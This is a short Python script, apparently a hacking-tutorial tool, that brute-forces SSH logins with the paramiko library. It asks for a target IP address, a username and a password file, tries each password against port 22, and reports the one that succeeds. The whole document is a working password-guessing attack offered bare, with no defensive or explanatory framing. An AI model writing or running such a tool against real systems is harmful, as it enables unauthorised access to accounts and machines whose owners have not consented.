import paramiko, sys, os, socket, termcolor

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target_ip, port=22, username= username, password=password)

    except paramiko.AuthenticationException:
        code=1

    except socket.error as e:
        code = 2

    ssh.close()
    return code

target_ip = input('[+] Enter the targets ip address: ')
username = input('[+] Enter the targets username: ')
pass_file = input('[+] Enter the file with the Passwords: ')

if os.path.exists(pass_file) == False:
    print('The file/path does not exist, please enter the right fipytle/path')
    sys.exit(1)

with open(pass_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Password Found: ' + password + 'For Account: ' + username), 'green'))
                break

            elif response == 1:
                print('[-] Incorrect password: ' + password)

            elif response == 2:
                print('[!!] Cannot connect to system ')
                sys.exit(1)

        except Exception as e:
            print(e)
            pass
